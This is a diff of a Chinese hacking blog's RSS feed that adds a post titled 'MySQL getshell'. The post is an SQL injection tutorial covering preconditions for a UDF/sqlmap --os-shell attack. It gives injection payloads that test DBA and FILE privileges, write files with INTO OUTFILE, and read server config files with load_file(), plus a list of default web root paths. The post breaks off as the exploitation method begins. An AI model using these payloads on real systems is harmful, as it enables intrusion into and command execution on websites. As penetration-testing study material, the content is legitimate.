@@ -6,15 +6,50 @@
     <description>Recent content in Posts on H4ck3r Station</description>
     <generator>Hugo -- 0.155.1</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Sat, 31 Jan 2026 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 30 Jan 2026 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>我的第一篇黑客日志</title>
-      <link>http://localhost:1313/posts/first-log/</link>
-      <pubDate>Sat, 31 Jan 2026 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/posts/first-log/</guid>
-      <description>&lt;h1 id=&#34;终于看到我了&#34;&gt;终于看到我了！&lt;/h1&gt;
-&lt;p&gt;如果你能看到这行字，说明配置终于通了。&lt;/p&gt;</description>
+      <title>MySQL getshell</title>
+      <link>http://localhost:1313/posts/mysql-getshell/</link>
+      <pubDate>Fri, 30 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/mysql-getshell/</guid>
+      <description>&lt;h2 id=&#34;udf--os-shell&#34;&gt;UDF  (&amp;ndash;os-shell)&lt;/h2&gt;
+&lt;h3 id=&#34;利用条件&#34;&gt;利用条件&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;数据库为DBA,可以使用sqlmap的&lt;code&gt;--is-dba&lt;/code&gt;查看当前网站连接的数据库账户是否是管理员&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;没有具体值&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;查找:
+1. --sql-shell 
+1. 进入数据库后: SHOW VARS LIKE &amp;#39;secure_file_priv&amp;#39;;
+2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL 
+	返回正常则null,无法写入
+	页面异常则,则不是null
+	判断是否为空:
+	?id=1 AND length(@@secure_file_priv) = 0	页面正常则为空
+3. 尝试写入文件: ?id=1 INTO OUTFILE &amp;#39;/var/www/html/test.txt&amp;#39; -- 根据报错信息判断
+4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type=&amp;#39;FILE&amp;#39; AND grantee=CONCAT(&amp;#34;&amp;#39;&amp;#34;, (SELECT CURRENT_USER()), &amp;#34;&amp;#39;&amp;#34;)) IS NOT NULL	即使secure_file_priv为空,用户没有FILE权限,也无法写入
+或者
+AND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;知道网站的绝对路径&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;查找:
+1. 注入报错信息
+2. 利用内部函数和元数据:
+Apache (Ubuntu):  UNION SELECT 1, load_file(&amp;#39;/etc/apache2/sites-enabled/000-default.conf&amp;#39;), 3
+Nginx:               UNION SELECT 1, load_file(&amp;#39;/etc/nginx/nginx.conf&amp;#39;), 3
+Windows (IIS):       C:\Windows\System32\inetsrv\config\applicationHost.config
+3.常见的默认路径:
+Linux (Apache)	/var/www/html/, /var/www/www.example.com/
+Linux (Nginx)	/usr/share/nginx/html/, /var/www/html/
+Windows (IIS)	C:\inetpub\wwwroot\
+Windows (XAMPP)	C:\xampp\htdocs\
+Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h3&gt;
+&lt;p&gt;方法一: &amp;ndash;os-shell&lt;/p&gt;</description>
     </item>
   </channel>
 </rss>
